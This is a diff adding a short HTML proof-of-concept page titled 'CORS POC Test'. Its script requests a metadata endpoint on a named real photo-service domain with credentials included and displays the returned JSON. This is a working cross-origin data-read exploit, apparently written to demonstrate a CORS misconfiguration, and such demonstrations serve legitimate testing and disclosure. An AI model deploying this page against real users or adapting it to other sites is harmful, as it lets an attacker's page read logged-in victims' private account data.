@@ -1,0 +1,20 @@
+<!DOCTYPE html>
+<html>
+  <body>
+    <h1>CORS POC Test</h1>
+    <pre id="out">Loading...</pre>
+
+    <script>
+      fetch("https://ws.shutterfly.com/services/csblueprint/bp/data//23/12/25041/metadata", {
+        credentials: "include"
+      })
+      .then(r => r.json())
+      .then(data => {
+        document.getElementById("out").innerText = JSON.stringify(data, null, 2);
+      })
+      .catch(err => {
+        document.getElementById("out").innerText = "Error: " + err;
+      });
+    </script>
+  </body>
+</html>
